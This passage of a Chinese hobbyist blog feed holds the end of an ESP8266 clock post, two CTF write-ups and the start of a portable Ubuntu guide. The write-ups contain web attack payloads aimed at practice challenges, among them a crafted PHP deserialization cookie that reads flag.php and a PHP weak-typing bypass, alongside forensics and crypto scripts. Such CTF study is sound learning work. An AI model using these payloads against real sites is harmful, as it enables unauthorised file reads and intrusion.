src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20211110151642.jpg" alt="20211110151642"></p><blockquote><h2 id="通过安信可公众号实现自动配网"><a href="#通过安信可公众号实现自动配网" class="headerlink" title="通过安信可公众号实现自动配网"></a>通过安信可公众号实现自动配网</h2></blockquote><p>​酷安的金牌神盾老哥的代码连接网络需要将，wifi的SSID和密码写入到代码中才能实现连接网络，这种方法虽然减少了出现bug的概率，但是有一个非常大的短板就是当你作为礼物送给别人是他们可能没有相对应的设备进行更改源代码，并重新写入。但是我发现了另外一位酷安老哥对代码进行重构之后，在代码中加入了安信可的代码可以实现安信可设备的自动配网需求。</p><p>1.在设备连接到你想让esp8266连接的wifi的前提下，微信搜索<strong>安信可科技公众号</strong>，选择底部的微信配网</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20211115120401230.png" alt="image-20211115120401230"></p><p>2.点击开始配置，并输入wifi密码，设备需打开定位服务</p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/2021111151207.jpg" alt="2021111151207"  /><p>4.等待连接完毕，如果出现连接问题请重试，并重启esp8266.</p><blockquote><h2 id="使用微积木制作外壳美化一下"><a href="#使用微积木制作外壳美化一下" class="headerlink" title="使用微积木制作外壳美化一下"></a>使用微积木制作外壳美化一下</h2></blockquote><p>在我和我的美术指导(我室友)的半天努力下终于，完成最终章</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20220513150514.jpg"></p><p> 所需文件 </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1omZ4J_tDpXmxdZaL-3AVgw </span><br><span class="line">提取码：p5hn</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20211113150514.jpg&quot; alt=&quot;20211113150514&quot;&gt;&lt;/p&gt;
&lt;p&gt;这几天刷酷安看到有大佬通过esp8266模块加1.3寸TFT屏幕做成的外星人时钟，瞬间感觉心动不已，于是立马淘宝下单采购原材料。(一块ESP8266开发板+USB数据线+母对母的杜邦线,一块1.3寸TFT屏幕，像我一样的小白建议买带针脚的。)  ； &lt;strong&gt;所需文件链接我会放在文章最后&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="日常发烧" scheme="http://www.beigui.xyz/tags/%E6%97%A5%E5%B8%B8%E5%8F%91%E7%83%A7/"/>
    
  </entry>
  
  <entry>
    <title>sword战队选拔赛部分WP</title>
    <link href="http://www.beigui.xyz/2021/07/24/swordctf-wp/"/>
    <id>http://www.beigui.xyz/2021/07/24/swordctf-wp/</id>
    <published>2021-07-24T10:41:54.000Z</published>
    <updated>2022-09-17T09:16:49.497Z</updated>
    
    <content type="html"><![CDATA[<p>​前两天参加lsword团队的选拔赛，非常意外的将web题全部AK，也十分荣幸的加入了sword团队可以和大佬们一起交流进步，也在博客记录一下比赛中做出来的几道题目</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20210724200829.png"></p><span id="more"></span><p>平台ID：北轨</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20210724191043113.png" alt="image-20210724191043113"></p><p><strong>签到</strong></p><p>将签到.exe文件放入IDA中得到flag</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20210724191003.png"></p><p><strong>社会主义核心价值观</strong></p><p>百度搜素社会主义核心价值观解密</p><p><strong>Easy_rsa</strong></p><p>下载得到cry200无后缀名文件，放入010查看文件头为504B0304，可以判断为zip文件，将文件作为zip文件解压得到key.pem和cipher.bin</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/clip_image008.png" alt="img"></p><p>使用openssl对key.pem进行解密</p><p>得到modulus和exponent</p><p>在网站上<a href="http://factordb.com/%E5%B0%86modulus%E5%88%86%E8%A7%A3%E4%B8%BAp%E5%92%8Cq">http://factordb.com/将modulus分解为p和q</a></p><p>最后使用rsa解密脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">n = <span class="number">0xspan></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">a = (<span class="number">2</span>**<span class="number">4244</span>)*<span class="number">699549860111847</span>-<span class="number">1</span></span><br><span class="line">b = (<span class="number">2</span>**<span class="number">4244</span>)*<span class="number">699549860111847</span>+<span class="number">1</span></span><br><span class="line">fn = (a - <span class="number">1</span>) * (b - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,fn)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;cipher.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  datas = <span class="built_in">int</span>.from_bytes(f.read(),byteorder=<span class="string">&#x27;big&#x27;</span>,signed=<span class="literal">False</span>)</span><br><span class="line">  out = <span class="built_in">pow</span>(datas,d,n)</span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">int</span>(out).to_bytes(<span class="number">72</span>,byteorder=<span class="string">&#x27;big&#x27;</span>,signed=<span class="literal">False</span>).decode(<span class="string">&quot;ascii&quot;</span>))</span><br></pre></td></tr></table></figure><p><strong>babyweb</strong></p><p>万能密码出flag文件路径访问得到flag</p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/clip_image010.png" alt="img" style="zoom:150%;" /><p>访问@99687c6233418217&#x2F;flag.txt</p><img src="https://gitee.com/bei-gui/picture_bed/raw/master/img/clip_image011.png" alt="img" style="zoom:150%;" /><p><strong>Easy_xxe</strong></p><p>闪灵cms的nday，封神台原题这里就不写了</p><p><strong>Web</strong></p><p>Preg_match匹配正则表达式过滤了数字</p><p>但是下面的$result又需要$num和$str满足变量都是数字</p><p>这里使用(‘&gt;’&gt;’&lt;’)+(‘&gt;’&gt;’&lt;’)基于php弱类型特性得到true值为1</p><p>Payload num&#x3D;1&amp;str&#x3D;(‘&gt;’&gt;’&lt;’)+(‘&gt;’&gt;’&lt;’)</p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/clip_image013.png" alt="img" style="zoom:150%;" /><p><strong>Easy_web</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$s</span> = <span class="keyword">new</span> <span class="title function_ invoke__">readme</span>();</span><br><span class="line">   <span class="variable">$s</span>-&gt;source = <span class="keyword">__FILE__</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">   <span class="keyword">exit</span>; <span class="comment">//构造反序列化字符串使其使用readme函数读取flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//$todos = [];</span></span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$c</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;todos&#x27;</span>];</span><br><span class="line">   <span class="variable">$h</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">0</span>, <span class="number">32</span>);</span><br><span class="line">   <span class="variable">$m</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">32</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$m</span>) === <span class="variable">$h</span>) &#123;<span class="comment">//前32位的值应该是后32位的MD5</span></span><br><span class="line">     <span class="variable">$todos</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$m</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$todo</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;text&#x27;</span>];</span><br><span class="line">   <span class="variable">$todos</span>[] = <span class="variable">$todo</span>;</span><br><span class="line">   <span class="variable">$m</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$todos</span>);</span><br><span class="line">   <span class="variable">$h</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$m</span>);</span><br><span class="line">   <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;todos&#x27;</span>, <span class="variable">$h</span>.<span class="variable">$m</span>);</span><br><span class="line">   <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: &#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">   <span class="keyword">exit</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>根据核心处代码，使用bp在cookie处构造payload</p><p>e2d4f7dcc43ee1db7f69e76303d0105ca:1:{i:0%3bO:6:”readme”:1:{s:6:”source”%3bs:8:”flag.php”%3b}}</p><p>(PS:因为cookie是通过url编码储存的所以需要将构造出来的payload进行url编码)</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;​	前两天参加lsword团队的选拔赛，非常意外的将web题全部AK，也十分荣幸的加入了sword团队可以和大佬们一起交流进步，也在博客记录一下比赛中做出来的几道题目&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/20210724200829.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF Writeup" scheme="http://www.beigui.xyz/tags/CTF-Writeup/"/>
    
  </entry>
  
  <entry>
    <title>第二届newctf部分WP</title>
    <link href="http://www.beigui.xyz/2021/06/07/newctf/"/>
    <id>http://www.beigui.xyz/2021/06/07/newctf/</id>
    <published>2021-06-07T03:29:05.000Z</published>
    <updated>2022-09-17T09:16:49.499Z</updated>
    
    <content type="html"><![CDATA[<p>上周带学弟参加了一个民间比赛，本来比赛介绍是“萌新“赛，我就准备让学弟试试手，结果呀我就 不该相信CTF的萌新字眼，学弟看到题目一脸懵逼，于是我也注册账号参加比赛，结果看到题目确实是非常”萌新“，让我自己都感觉自己还是一个萌新，明明是萌新赛结果大佬云集，肝到最后才一百多名，虽然群主说本次比赛有一千多人参加，一百多名属于前列了，但还是感觉自己是一个小菜鸡（PS：如果自己做题快的话，可能我就有贴纸了😢）,下面小菜鸡就把做出的题目的WP写下来记录一下吧！</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20210607115058354.png" alt="image-20210607115058354"></p><span id="more"></span><blockquote><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2></blockquote><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>下载flag.txt,打开看到下列字符，%3D换成&#x3D;，就可以很简单看出这是一串base64字符</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTQ1NjcwNTg1MjMwNGU2MTRkN2E0ZTUwNTQ2YzU2NTg1NDdhNGU1NDRlMzAzNTQ3NTc0NTU5MzI0ZTQ2NTI0YjU0NTQ1NjU2NTM0NTZiMzM1MzU0MzAzZA%<span class="number">3</span>D%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><p>将base64解密，是一串十六进制字符串，将十六进制转换为ascii码之后</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5456705852304e614</span>d7a4e50546c5658547a4e544e303547574559324e46524b5454565653456b335354303d</span><br></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TVpXR0NaMzNPTlVXTzNTN05GWEY2NFRKTTVVSEk3ST0=</span><br></pre></td></tr></table></figure><p>再进行一次base64解码和一次base32结果得到flag(PS:套神的WP写起来都这么套😒)</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sign_in_right&#125;</span><br></pre></td></tr></table></figure><h3 id="rsa256"><a href="#rsa256" class="headerlink" title="rsa256"></a>rsa256</h3><p>这题是i春秋欢乐赛原题，直接贴链接</p><p><a href="https://blog.csdn.net/hanjinrui15/article/details/102017927">(15条消息) i春秋第二届春秋欢乐赛RSA256writeup_hanjinrui15的博客-CSDN博客</a></p><blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2></blockquote><h3 id="very-ez-dump"><a href="#very-ez-dump" class="headerlink" title="very-ez-dump"></a>very-ez-dump</h3><p>下载下来是一个明叫mem.raw的文件这里使用kali来解决问题需要用到的工具是volatility工具</p><p>先吧镜像移动到kali里边，然后打开volatility，执行命令查看镜像系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f <span class="string">&#x27;/root/桌面/mem.raw&#x27;</span> imageinfo</span><br></pre></td></tr></table></figure><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20210607201358317.png" alt="image-20210607201358317"></p><p>可以看到我们要看的系统是 win7SP1x64</p><p>然后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f <span class="string">&#x27;/root/桌面/mem.raw&#x27;</span>  --profile=Win7SP1x64 cmdscan</span><br></pre></td></tr></table></figure><p>来查看cmd命令使用的情况</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/clip_image002.jpg" alt="img"></p><p>可以看到#7的是密码然后扫描这个镜像里面的文件执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f <span class="string">&#x27;/root/桌面/mem.raw&#x27;</span>  --profile=Win7SP1x64 filescan | grep zip</span><br></pre></td></tr></table></figure><p>，可以看到一个后缀是zip的flag文件</p><p>提取这个文件执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility -f <span class="string">&#x27;/root/桌面/mem.raw&#x27;</span>  --profile=Win7SP1x64 dumpfiles -Q 0x000000003e4b2070 --dump-dir=./</span><br></pre></td></tr></table></figure><p>可以提取到桌面上， 把压缩包移动到Windows上解压，密码就是 （ljmmz）ovo就可以看到一个txt打开就可以看到flag</p><h3 id="！了反都，了反"><a href="#！了反都，了反" class="headerlink" title="！了反都，了反"></a>！了反都，了反</h3><p>下载下来是一个<strong>piz,flag</strong>文件，根据题目描述我们将文件名字倒过来，就是<strong>flag.zip</strong>打开压缩包看到一个流量包文件，使用<strong>wireshark</strong>打开，进行流量分析，可以看到这个流量包捕获的流量是访问网站的流量，我们进行http过滤</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20210607203403834.png" alt="image-20210607203403834"></p><p>根据题目描述进行字符串搜索，多次尝试后发现下载了一个后缀为piz的文件，我们将其数据导出来，发现无法解压，根据题目描述和十六进制信息，发现需要将十六进制信息前后顺序颠倒，直接用代码（PS：赛后看官方WP其实有更简单的脚本）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27; &#x27;&#x27;&#x27;</span>    <span class="comment">#存放十六进制数据</span></span><br><span class="line">list1 = data.split() <span class="comment">#以空格分裂</span></span><br><span class="line"></span><br><span class="line">list1 = <span class="built_in">reversed</span>(list1) <span class="comment">#逆转list</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27; &#x27;</span>.join(list1) <span class="comment">#list 拼接为句子</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (a)</span><br></pre></td></tr></table></figure><p>修改后的压缩包存放着flag.txt但是存在密码，压缩包提示当中注释解压密码是登录账号，查看流量包发现登录成功的密码是passwd123</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20210607204143471.png" alt="image-20210607204143471"></p><p>解压后的文件是很多行的base64数据，这里想到base64解密，上脚本</p><p>\</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># base64隐写</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_diff</span>(<span class="params">s1, s2</span>):</span><br><span class="line"></span><br><span class="line">  base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">  res = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s2)):</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line"></span><br><span class="line">​      <span class="keyword">return</span> <span class="built_in">abs</span>(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64_stego_decode</span>():</span><br><span class="line"></span><br><span class="line">  file = <span class="built_in">open</span>(<span class="string">&quot;zheng.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">  x = <span class="string">&#x27;&#x27;</span>                   <span class="comment"># x即bin_str</span></span><br><span class="line"></span><br><span class="line">  lines = file.readlines()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line"></span><br><span class="line">​    l = <span class="built_in">str</span>(line, encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">​    stego = l.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">​    \<span class="comment">#print(stego)</span></span><br><span class="line"></span><br><span class="line">​    realtext = base64.b64decode(l)</span><br><span class="line"></span><br><span class="line">​    \<span class="comment">#print(realtext)</span></span><br><span class="line"></span><br><span class="line">​    realtext = <span class="built_in">str</span>(base64.b64encode(realtext),encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">​    \<span class="comment">#print(realtext)</span></span><br><span class="line"></span><br><span class="line">​    diff = get_diff(stego, realtext)    <span class="comment"># diff为隐写字串与实际字串的二进制差值</span></span><br><span class="line"></span><br><span class="line">​    n = stego.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> diff:</span><br><span class="line"></span><br><span class="line">​      x += <span class="built_in">bin</span>(diff)[<span class="number">2</span>:].zfill(n*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">​      x += <span class="string">&#x27;0&#x27;</span> * n*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">​      </span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(x):</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> <span class="built_in">int</span>(x[i:i+<span class="number">8</span>],<span class="number">2</span>):</span><br><span class="line"></span><br><span class="line">​      flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(x[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">​    i += <span class="number">8</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">  b64_stego_decode()</span><br></pre></td></tr></table></figure><p>flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cfcd208495d565ef66e7dff9f98764da&#125;</span><br></pre></td></tr></table></figure><blockquote><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2></blockquote><h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h3><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20210607204831665.png" alt="image-20210607204831665"></p><p>通过这些代码我们获取到的信息是</p><p>1.POST传参2.强类型</p><p>满足这些内容我们就可以进行下一步了</p><p><strong>{e10adc3949ba59abbe56e057f20f883e}</strong><br>通过代码我们可以看出这串字符是运用了MD5进行加密处理，我们运用MD5进行解码得到<code>｛123456｝ 代码中可以看出array是溢出+1我们通过查询得出溢出值</code>9223372036854775807<br>那么我所用到的数是<code>9223372036854775807-1</code>就是&#96;&#96;9223372036854775806</p><p>POST传参我们运用到一款工具HackBar</p><p>首先题目告诉我们</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>) `&amp;&amp; ``<span class="variable">$a</span> ``!== ``<span class="variable">$b</span>`</span><br></pre></td></tr></table></figure><p>我们上传md5($a)和md5($b)的值相等但是<code>$a``不等于``$b</code></p><p>那么我们可以</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20210607205008003.png" alt="image-20210607205008003"></p><p>根据题目描述<strong>hint:这个图片真好看呀，没啥隐藏的东西吧</strong>以及给出的背景图片我们下载背景图，使用binwalk分离出一个压缩包，根据web题解出的压缩包密码，解压得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newsctf&#123;this_1s_veryveryveryeasyweb&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;上周带学弟参加了一个民间比赛，本来比赛介绍是“萌新“赛，我就准备让学弟试试手，结果呀我就 不该相信CTF的萌新字眼，学弟看到题目一脸懵逼，于是我也注册账号参加比赛，结果看到题目确实是非常”萌新“，让我自己都感觉自己还是一个萌新，明明是萌新赛结果大佬云集，肝到最后才一百多名，虽然群主说本次比赛有一千多人参加，一百多名属于前列了，但还是感觉自己是一个小菜鸡（PS：如果自己做题快的话，可能我就有贴纸了😢）,下面小菜鸡就把做出的题目的WP写下来记录一下吧！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20210607115058354.png&quot; alt=&quot;image-20210607115058354&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="http://www.beigui.xyz/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>一个闪闪发光的Linux to go诞生记</title>
    <link href="http://www.beigui.xyz/2021/05/11/ubuntu/"/>
    <id>http://www.beigui.xyz/2021/05/11/ubuntu/</id>
    <published>2021-05-11T11:19:53.000Z</published>
    <updated>2022-09-17T09:16:49.497Z</updated>
    
    <content type="html"><![CDATA[<p>在经历了网管软件的洗礼之后，我发现windows下面还是少装一些软件比较好，因为重装系统之后再配置环境真的好麻烦！！！（ps：这也是我这么就不更新博客的一个理由把）<br>于是我萌生了制作一个linux to go的想法，但是想法美好现实却是十分悲惨，整个过程可以说是经历了重重困难，但是正所谓“只要思想不滑坡，办法总比困难多；”<br>于是这么久没有更新的博客终于在我的ubuntu重新焕发了生机</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/2021-05-2215-55-17.png"></p><span id="more"></span><blockquote><h2 id="在移动硬盘中安装linux-to-go"><a href="#在移动硬盘中安装linux-to-go" class="headerlink" title="在移动硬盘中安装linux to go"></a>在移动硬盘中安装linux to go</h2></blockquote><p>通常进行linux系统安装有两种方法，第一种是制作启动U盘，然后进入U盘系统，分好分区进行安装，还有就是第二种方法借助虚拟机软件将ubuntu安装程序，安装在虚拟机上再将移动硬盘插入虚拟机，(注意，移动硬盘一般为USB3.0，所以已经要将虚拟机设置为USB3.0否则会无法读取硬盘)</p><p>安装步骤这里就不详细描述了，进入ubuntu live之后的安装系统步骤，参考虚拟机安装系统,需要注意的是系统分区这一步骤,如果你的移动硬盘除了安装ubuntu之外还想继续当作存储介质使用，就需要将硬盘的后半部分划分为NTFS分区，前面空余部分不在windows下进行分区，在虚拟机上启动ubuntu live后，在安装ubuntu时选择自定义分区然后，按照如下规则进行分区和挂载。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\ 根目录，没什么好解释的</span><br><span class="line"></span><br><span class="line">\boot启动目录，不过我觉得直接叫Boot更好，用于储存一些Linux启动的文件，我这里是移动硬盘所以最好弄一个吧</span><br><span class="line"></span><br><span class="line">\homeEmmm这里开始就是平时经常能触及到的，用户文件一类的地方了，存自己东西的</span><br><span class="line"></span><br><span class="line">\swap 　虚拟内存，我这里用了10G</span><br></pre></td></tr></table></figure><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/2021-05-2215-38-48.png"></p><p>设置好分区后接着往后安装，后面的设置项如果不明白什么意思一直默认安装就好，完成安装后关闭虚拟机，重启电脑选择启动项为移动硬盘。此时安装步骤就完成了，恭喜你已经获得一个可以随时随地办公的linux to go了！！！</p><p>但是真的结束了吗？不，对于拥有独立显卡的电脑并没有结束，因为真的是卡住动不了啊！！！</p><blockquote><h2 id="解决独立显卡驱动问题"><a href="#解决独立显卡驱动问题" class="headerlink" title="解决独立显卡驱动问题"></a>解决独立显卡驱动问题</h2></blockquote><p>首先启动ubuntu之后会自动进入grub界面，这里我们依次选择ubuntu 的高级选项，然后按照图片的选项选因为每个版本的内容都是大同小异的记住位置即可</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/56DEB41DCFCD29131B5C57540BC07960.jpg"></p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/21F37F40EBB3E2FE71DB241C86E7C655.jpg"></p><p><img 